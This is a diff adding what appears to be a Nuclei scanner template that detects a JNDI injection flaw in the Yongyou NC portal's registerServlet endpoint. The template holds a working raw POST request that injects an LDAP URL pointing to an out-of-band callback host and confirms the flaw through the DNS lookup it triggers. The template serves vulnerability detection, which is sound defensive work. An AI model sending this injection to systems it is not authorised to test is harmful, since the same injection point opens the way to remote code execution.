@@ -1,0 +1,32 @@
+id: yongyou-nc-portal-registerservlet-jndi-injection
+info:
+  name: Yongyou NC portal-registerServlet JNDI Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ldap-injection
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /portal/registerServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=1&dsname=ldap://{{reverse}}
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "type=1"
+          - "dsname=ldap"
